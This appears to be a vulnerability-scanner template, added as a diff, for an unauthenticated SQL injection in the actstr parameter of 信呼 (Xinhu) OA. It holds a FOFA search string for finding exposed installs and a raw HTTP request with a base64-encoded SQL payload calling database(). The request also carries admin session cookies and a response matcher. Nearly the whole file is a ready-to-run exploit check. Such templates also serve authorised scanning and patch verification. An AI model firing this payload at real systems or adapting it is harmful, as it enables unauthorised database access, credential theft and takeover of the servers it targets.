@@ -1,0 +1,29 @@
+id: xinhua-oa-actstr-sqli
+
+info:
+  name: "信呼OA actstr 接口 SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="信呼-OA系统"
+          信呼OA系统actstr接口存在未经验证的SQL注入缺陷，攻击者可通过构造恶意SQL查询语句绕过身份认证机制，直接访问数据库内容（包括管理员后台凭证、用户隐私数据等敏感信息）。在具备高权限写入条件下，可利用注入点向服务器写入恶意代码，最终实现对目标系统的完全控制。
+  tags: 信呼OA
+
+http:
+- raw:
+  - |
+    GET /index.php?m=input&a=getselectdata&d=flow&ajaxbool=true&act=&actstr=eGluaHVfY2l0eSxpZCxhZG1pbnxkYXRhYmFzZSgpIC0tIA== HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Language: zh-CN,zh;q=0.9
+    X-Requested-With: XMLHttpRequest
+    Accept: application/json, text/javascript, */*; q=0.01
+    Accept-Encoding: gzip, deflate
+    Cookie: PHPSESSID=oqf7b3c33t8ft9539vekst32gp; deviceid=1753372073236; xinhu_mo_adminid=tu0qul0tt0kc0quu0cz0quk0xu0tc0zq0xv0quk0zc0zq0zv0xc09; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0; XDEBUG_SESSION=PHPSTORM
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'database'
